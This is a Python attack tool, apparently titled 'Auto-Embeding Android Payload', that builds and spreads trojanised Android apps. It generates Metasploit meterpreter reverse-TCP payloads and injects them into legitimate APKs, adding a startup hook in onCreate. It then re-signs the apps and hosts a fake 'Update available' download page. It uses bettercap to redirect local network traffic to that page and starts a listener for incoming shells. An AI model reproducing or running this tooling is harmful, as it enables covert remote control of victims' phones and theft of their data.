#!/usr/bin/env python3

# ------------ #
# 	  Made     #
#      by      #
#     XYZT     #
# ------------ #

import os
import subprocess
import shutil

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def c():
	os.system("clear")

def removeNewLine(arr):
	for i in range(len(arr)):
		arr[i] = arr[i].replace("\n", "")	
	return arr

def colorPayload(arr):
	for i in range(len(arr)):
		#if wifi name and ip values match
		if arr[i] == "Payload_{}_{}.apk".format(IP_ADDR, ESSID):
			print("{}. ".format(i) + bcolors.OKBLUE + "{}".format(arr[i]) + bcolors.ENDC)
		else:
			print("{}. {}".format(i, arr[i]))

def colorPayloaded(arr):
	for i in range(len(arr)):
		#if wifi name and ip values match
		if "_{}_{}_injected.apk".format(IP_ADDR, ESSID) in arr[i]:
			print("{}. ".format(i) + bcolors.OKBLUE + "{}".format(arr[i]) + bcolors.ENDC)
		else:
			print("{}. {}".format(i, arr[i]))

def listFiles(arr):
	for i in range(len(arr)):
		print("{}. {}".format(i, arr[i]))

def check(usr):
	return usr == "Y" or usr == "y" or usr == ""

def checkInv(usr):
	return usr == "N" or usr == "n" or usr == ""

def warning(msg):
	print(bcolors.FAIL + msg + bcolors.ENDC)
	input()
	main()

def getIP():
	getIP = os.popen("hostname -I").readlines()
	ipAddr = removeNewLine(getIP)
	ipAddr = ipAddr[0].replace(" ", "")
	return ipAddr

def getESSID():
	getWifiName = os.popen("iwgetid -r").readlines()
	wifiName = removeNewLine(getWifiName)
	try:
		wifiName = wifiName[0]
	except IndexError:
		print(bcolors.FAIL + "You are not connected to Wi-Fi!" + bcolors.ENDC)
		exit()

	if wifiName == "":
		getESSID()

	return wifiName

def onstart():
	global FILES, KEYSTORES
	#create ROOT_DIR
	if os.path.isdir(ROOT_DIR) == False:
		os.system("mkdir /root/AEAP")

	#getting apk files in ROOT_DIR
	getFiles = os.popen("ls {} | grep .apk".format(ROOT_DIR)).readlines()
	FILES = removeNewLine(getFiles)

	#getting keystores in ROOT_DIR
	getKeystores = os.popen("ls {} | grep .keystore".format(ROOT_DIR)).readlines()
	KEYSTORES = removeNewLine(getKeystores)	

	if len(FILES) == 0:
		print("-> " + bcolors.FAIL + "Please, place your original .apk files in the {} and restart this script!\n".format(ROOT_DIR) + bcolors.ENDC)
		exit()

def ret():
	input()
	main()

def finish():
	header("Thanks for using :)")
	print("Made by" + bcolors.HEADER + " XYZT " + bcolors.ENDC)
	exit()

def header(msg):
	print("---" + bcolors.HEADER + " {} ".format(msg) + bcolors.ENDC + "---\n")

def footer(msg):
	print("\n--->" + bcolors.OKGREEN + " {} ".format(msg) + bcolors.ENDC + "<---")

def menugroup(msg):
	print("\n---" + bcolors.HEADER + " {} ".format(msg) + bcolors.ENDC + "---")

def apacheStatus():
	global APACHE_STATUS
	getApacheStatus = os.popen("service --status-all | grep apache2").readlines()
	apacheStatus = removeNewLine(getApacheStatus)
	char = apacheStatus[0].count("+")

	if char == 1:
		APACHE_STATUS = bcolors.OKGREEN + "IS RUNNING" + bcolors.ENDC
	else:
		APACHE_STATUS = bcolors.FAIL + "IS NOT RUNNING" + bcolors.ENDC

def apachePort():
	global APACHE_PORT
	getApachePort = os.popen("cat /etc/apache2/ports.conf | grep Listen | head -1").readlines()
	apachePort = removeNewLine(getApachePort)
	port = apachePort[0].split(" ")
	return port[1]

def maintitle():
	print(bcolors.FAIL + "[({- " + bcolors.ENDC + bcolors.WARNING + "A" + bcolors.ENDC + bcolors.BOLD + "uto-" + bcolors.ENDC + bcolors.WARNING + "E" + bcolors.ENDC + bcolors.BOLD + "mbeding " + bcolors.ENDC + bcolors.WARNING + "A" + bcolors.ENDC + bcolors.BOLD + "ndroid " + bcolors.ENDC + bcolors.WARNING + "P" + bcolors.ENDC + bcolors.BOLD + "ayload" + bcolors.ENDC + bcolors.FAIL + " -})]" + bcolors.ENDC)
	print("                     made by " + bcolors.HEADER + "XYZT" + bcolors.ENDC)

ROOT_DIR = "/root/AEAP/"
IP_ADDR = getIP()
ESSID = getESSID()
FILES = []
KEYSTORES = []
ORIGINAL = ""
PAYLOAD = ""
APACHE_STATUS = ""
APACHE_PORT = apachePort()

##### MAIN FUNCTIONS #####
def m_autoPayload():
	c()
	header("Generating and Injecting Payload")
	listFiles(FILES)
	apkFile = input("Choose .apk file to inject payload [number]: ")
	os.system("msfvenom -x {}{} -p android/meterpreter/reverse_tcp LHOST={} LPORT=4444 -o {}{}".format(ROOT_DIR, FILES[int(apkFile)], IP_ADDR, ROOT_DIR, FILES[int(apkFile)].replace(".apk", "_injected.apk")))
	footer("Done!")
	ret()

def m_createPayload():
	c()
	header("Creating Payload")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT=4444 R > {}Payload_{}_{}.apk".format(IP_ADDR, ROOT_DIR, IP_ADDR, ESSID))
	footer("Done!")
	ret()

def m_injectPayload():
	global PAYLOAD, ORIGINAL

	CHECK_PAYLOAD = True
	# Check if payload exists
	for i in FILES:
		if i == "Payload_{}_{}.apk".format(IP_ADDR, ESSID):
			CHECK_PAYLOAD = True
			break
		else:
			CHECK_PAYLOAD = False

	if CHECK_PAYLOAD == False:
		warning("You can't inject payload, because you don't have one. Please, generate payload.")
		ret()

	##### PART 1 - Choosing files
	c()
	header("[1 / 11] Choosing files")
	colorPayload(FILES)
	PAYLOAD = input("\nChoose a payload .apk file to decompile [number]: ")
	ORIGINAL = input("Choose a original .apk file to decompile [number]: ")

	##### SIDE PART - Removing old directories
	shutil.rmtree("{}original".format(ROOT_DIR), ignore_errors=True)
	shutil.rmtree("{}payload".format(ROOT_DIR), ignore_errors=True)

	##### PART 2 - Decompiling apks
	c()
	header("[2 / 11] Decompiling Applications")
	os.system("apktool d -f -o {}payload {}{}".format(ROOT_DIR, ROOT_DIR, FILES[int(PAYLOAD)]))
	os.system("apktool d -f -o {}original {}{}".format(ROOT_DIR, ROOT_DIR, FILES[int(ORIGINAL)]))

	##### PART 3 - Creating directories
	c()
	header("[3 / 11] Creating directories")
	os.system("mkdir {}original/smali/com/metasploit".format(ROOT_DIR))
	os.system("mkdir {}original/smali/com/metasploit/stage".format(ROOT_DIR))

	##### PART 4 - Copying payload files to original apk
	c()
	header("[4 / 11] Copying payload files")
	os.system("cp {}payload/smali/com/metasploit/stage/* {}original/smali/com/metasploit/stage".format(ROOT_DIR, ROOT_DIR))

	##### PART 5 - Getting whole path to main launcher script
	c()
	header("[5 / 11] Main Launcher Path")
	print("Find following lines:\n\n" + bcolors.WARNING + "<intent-filter>\n    <action android:name='android.intent.action.MAIN'/>\n    <category android:name='android.intent.category.LAUNCHER'/>\n</intent-filter>" + bcolors.ENDC + "\n\nThese lines are located in " + bcolors.OKBLUE + "<activity>" + bcolors.ENDC + " tag. Find " + bcolors.OKBLUE + "'android:name'" + bcolors.ENDC + " in that <activity> tag. Paste it's value here (without quotation marks)!")
	os.popen("gedit {}original/AndroidManifest.xml".format(ROOT_DIR))
	androidName = input("\nandroid:name=")

	##### PART 6 - Copying permissions from payload file
	c()
	header("[6 / 11] Copying Permissions")
	print("Copy all of the permissions in here, after copying, hit ENTER here!\n\nPermission looks like this:\n " + bcolors.HEADER + "<uses-permission android:name='android.permission.INTERNET'/>" + bcolors.ENDC)
	os.popen("gedit {}payload/AndroidManifest.xml".format(ROOT_DIR))
	input()

	##### PART 7 - Pasting copied permissions
	c()
	header("[7 / 11] Pasting Permissions")
	print("Paste all of the copied permissions, edit it by yourself what you want and what you don't, after pasting and editing, hit ENTER here!\n\nWhere to put the permissions?\n-> On the first line is " + bcolors.WARNING + "'<?xml'" + bcolors.ENDC + " under it or next to it is " + bcolors.WARNING + "'<manifest>'" + bcolors.ENDC + " tag, so " + bcolors.FAIL + "after this manifest tag put it on new line!" + bcolors.ENDC + "\n\n" + bcolors.WARNING + "Do NOT forget to SAVE!" + bcolors.ENDC)
	os.popen("gedit {}original/AndroidManifest.xml".format(ROOT_DIR))
	input()

	##### PART 8 - Setting up for inserting
	c()
	header("[8 / 11] Setting up for inserting script")
	androidName = androidName.replace(".", "/")
	editFile = "{}original/smali/{}.smali".format(ROOT_DIR, androidName)
	textInsert = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"

	##### PART 9 - Getting line of ...
	c()
	header("[9 / 11] Getting line of ...")
	getLine = os.popen("grep -nr ';->onCreate(Landroid/os/Bundle;)V' {}".format(editFile)).readlines()
	line = removeNewLine(getLine)
	line = line[0].split()
	line = line[0].replace(":", "")

	##### PART 10 - Inserting payload onstart script
	c()
	header("[10 / 11] Inserting payload onstart script")
	os.system("ex -sc '{}i|    {}' -cx {}".format(int(line) + 1, textInsert, editFile))

	##### PART 11 - Building an apk
	c()
	header("[11 / 11] Building Application")
	os.system("apktool b {}original".format(ROOT_DIR))

	##### SIDE PART - Renaming and moving apk
	newapk = FILES[int(ORIGINAL)].replace(".apk", "_{}_{}_injected.apk".format(IP_ADDR, ESSID))
	os.system("mv {}/original/dist/{} {}{}".format(ROOT_DIR, FILES[int(ORIGINAL)], ROOT_DIR, newapk))

	footer("Done!")
	ret()

def m_createCertificate():
	c()
	header("Creating certificate")
	print(bcolors.WARNING + "Do NOT forget these values!\n" + bcolors.ENDC)
	keyName = input("Keyname: ")
	alias = input("Alias: ")
	os.system("keytool -genkey -v -keystore {}{}.keystore -alias {} -keyalg RSA -keysize 2048 -validity 10000".format(ROOT_DIR, keyName, alias))
	footer("Done!")
	ret()

def m_signAnApp():
	c()

	if len(KEYSTORES) == 0:
		warning("You can't sign app, because you don't have any .keystores files! If you want to sign app, create certificate or copy any .keystores to {}".format(ROOT_DIR))

	header("Signing application")
	colorPayloaded(FILES)
	appToSign = input("\nChoose an .apk file to sign [number]: ")
	print()
	listFiles(KEYSTORES)
	keystore = input("\nChoose a keystore for signing an application [number]: ")
	alias = input("Alias: ")

	os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {}{} {}{} {}".format(ROOT_DIR, KEYSTORES[int(keystore)], ROOT_DIR, FILES[int(appToSign)], alias))
	footer("Done!")
	ret()

def m_installTools():
	c()
	header("Installing tools")
	os.system("apt update && apt install metasploit-framework bettercap apache2 apktool postgresql zipalign")
	footer("Done!")
	ret()

def m_readMe():
	c()
	header("README")
	print("-> " + bcolors.FAIL + "Please, place your original .apk files in the ROOT_DIR and restart this script!\n" + bcolors.ENDC)
	ret()

def m_reStartApache():
	os.system("service apache2 restart")
	apacheStatus()
	main()

def m_createWebsite():
	c()
	header("Creating website")
	colorPayloaded(FILES)
	apkToWeb = input("\nChoose an .apk file to use [number]: ")

	name = input("Rename .apk file (without .apk): ")
	name = "{}.apk".format(name)

	os.system("mv {}{} {}{}".format(ROOT_DIR, FILES[int(apkToWeb)], ROOT_DIR, name))
	
	htmlfile = """
	<!DOCTYPE html>
	<html>
		<head>
			<meta charset='utf-8'>
			<meta http-equiv='X-UA-Compatible' content='IE=edge'>
			<meta name='viewport' content='width=device-width, initial-scale=1'>
			<title>Updating App...</title>
			<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
			<link href='https://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet'>
			<style>
				*{margin:0;padding:0;box-sizing:border-box}html{font:400 16px sans-serif;color:#555}a{text-decoration:none;color:inherit;cursor:pointer;opacity:.9}.hero,a.btn{color:#fff;text-align:center}a:hover{opacity:1}a.btn{border-radius:4px;text-transform:uppercase;background-color:#2196F3;font-weight:800}section{display:flex;flex-direction:column;align-items:center;padding:125px 100px}@media (max-width:1000px){section{padding:100px 50px}}@media (max-width:600px){section{padding:80px 30px}}.hero{position:relative;justify-content:center;min-height:100vh}.hero .background-image,.hero .background-image:after{position:absolute;top:0;left:0;width:100%;height:100%}.hero .background-image{background-size:cover;background-color:#2196F3;z-index:-1}.hero .background-image:after{content:'';background-color:#414a4f;opacity:.75}.hero h1{font:700 60px 'Open Sans',sans-serif;margin-bottom:15px}.hero h3{font:400 28px 'Open Sans',sans-serif;margin-bottom:40px}.hero a.btn{padding:20px 46px}@media (max-width:800px){.hero{min-height:600px}.hero h1{font-size:48px}.hero h3{font-size:24px}.hero a.btn{padding:15px 40px}}
			</style>
		</head>
		<body>
			<section class='hero'>
				<div class='background-image' style='background-image: url(assets/img/hero.jpg);'></div>
				<h1>Update available</h1>
				<h3>Please update your software before proceeding</h3>
				<a href='""" + name + """' class='btn'>Download</a>
			</section>
		</body>
	</html>
	"""
	
	try:
		os.remove("/var/www/html/index.html")
	except:
		pass	
	
	os.system("echo '' > /var/www/html/index.html")
	hfile = open("/var/www/html/index.html","w") 
	hfile.write(htmlfile)
	hfile.close()
	#fixing not recognizing .html file as regular .html file
	os.system("mv /var/www/html/index.html /var/www/html/index")
	os.system("mv /var/www/html/index /var/www/html/index.html")
	os.system("mv {}{} /var/www/html/{}".format(ROOT_DIR, name, name))

	footer("Done!")
	ret()

def m_startBettercap():
	os.system("gnome-terminal -e 'bettercap --proxy-module redirect --redirect-url http://{}:{} --proxy-port 8081 --allow-local-connections --no-sslstrip'".format(IP_ADDR, APACHE_PORT))
	main()

def m_startMetasploit():
	os.system("gnome-terminal -e \"msfconsole -x 'use multi/handler;\set PAYLOAD android/meterpreter/reverse_tcp;\set LHOST {};\set LPORT 4444;\exploit -j'\"".format(IP_ADDR))
	main()

def mainChoice(ch):
	if ch == "0":
		m_autoPayload()
	elif ch == "1":
		m_createPayload()
	elif ch == "2":
		m_injectPayload()
	elif ch == "3":
		m_createCertificate()
	elif ch == "4":
		m_signAnApp()
	elif ch == "5":
		m_installTools()
	elif ch == "6":
		m_readMe()
	elif ch == "7":
		m_reStartApache()
	elif ch == "8":
		m_createWebsite()
	elif ch == "9":
		m_startBettercap()
	elif ch == "10":
		m_startMetasploit()
	elif ch == "99":
		finish()
	else:
		main()

def main():
	c()
	onstart()
	maintitle()

	print(bcolors.BOLD + "Wi-Fi: " + bcolors.ENDC + "{}".format(ESSID))
	print(bcolors.BOLD + "IP: " + bcolors.ENDC + "{}".format(IP_ADDR))
	print(bcolors.BOLD + "ROOT_DIR: " + bcolors.ENDC + "{}".format(ROOT_DIR))
	print(bcolors.BOLD + "Apache2: " + bcolors.ENDC + "{}".format(APACHE_STATUS))
	print(bcolors.BOLD + "Apache2 Port: " + bcolors.ENDC + "{}".format(APACHE_PORT))

	menugroup("Much faster way to inject payload")
	print("0) Automatically inject payload")

	menugroup("Payload")
	print("1) Create Payload")
	print("2) Inject Payload")

	menugroup("Certificate")
	print("3) Create certificate")
	print("4) Sign an application")

	menugroup("Other")
	print("5) Install needed tools")
	print("6)" + bcolors.FAIL + " README" + bcolors.ENDC)

	menugroup("Hacking")
	print("7) Re/Start Apache2 server")
	print("8) Create default index.html")
	print("9) Start bettercap for local redirection")
	print("10) Start metasploit")

	print("\n99) Exit")

	user = input("\n#--> ")
	mainChoice(user)

#os.system("service postgresql restart")
onstart()
apacheStatus()
getESSID()
main()